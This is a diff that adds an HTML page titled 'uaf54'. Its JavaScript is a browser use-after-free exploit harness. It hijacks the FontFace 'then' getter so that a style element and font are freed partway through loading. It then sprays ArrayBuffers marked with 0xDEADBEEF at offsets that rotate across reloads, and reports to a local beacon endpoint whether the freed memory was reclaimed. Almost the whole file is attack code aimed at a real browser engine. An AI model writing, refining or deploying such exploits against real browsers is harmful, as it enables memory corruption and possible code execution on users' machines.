@@ -1,0 +1,53 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf54</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+/* one offset per load, chosen from localStorage so successive reloads walk the
+   list without redeploying: the single-arm shape that demonstrably reclaims. */
+var OFFS=[0x28,0x30,0x38,0x40,0x48,0x50,0x60,0x70,0x80,0x90,0xA0,0x08,0x10,0x28];
+var idx=0;
+try { idx = parseInt(localStorage.getItem('occ')||'0',10)||0; } catch(e) { idx = 0; }
+if (idx >= OFFS.length) idx = 0;
+try { localStorage.setItem('occ', String(idx+1)); } catch(e) {}
+var OFF = OFFS[idx];
+var K = 16, SIZE = 192, styleEl = null, firedHere = false, MAP = [];
+var U = Date.now().toString(36);
+function run(){
+  var fam='s'+U, nm='f'+U;
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A=new FontFace(nm,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  window.__alive=[A];
+  b('U54-IDX-'+idx+'-OFF-'+OFF+'-PARSE');
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl=null;
+      document.body.offsetHeight;
+      MAP=[];
+      for (var k=0;k<K;k++){
+        var u=new Uint8Array(new ArrayBuffer(SIZE));
+        u[OFF]=0xEF; u[OFF+1]=0xBE; u[OFF+2]=0xAD; u[OFF+3]=0xDE;
+        MAP.push(u);
+      }
+      try { document.fonts.check('1em '+fam); } catch(e){}
+      b('U54-IDX-'+idx+'-OFF-'+OFF+'-CHECK-RETURNED');
+      return undefined;
+    }, set:function(){}
+  });
+  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){ b('U54-IDX-'+idx+'-RESOLVED'); },
+                                                     function(){ b('U54-IDX-'+idx+'-REJECTED'); });
+  setTimeout(function(){
+    var hit=-1;
+    for (var i=0;i<MAP.length;i++){ var u=MAP[i]; if (u[0x58]||u[0x59]||u[0x5A]||u[0x5B]) { hit=i; break; } }
+    b('U54-IDX-'+idx+'-OFF-'+OFF+'-HIT-'+hit);
+  }, 120);
+}
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf54</p></body></html>
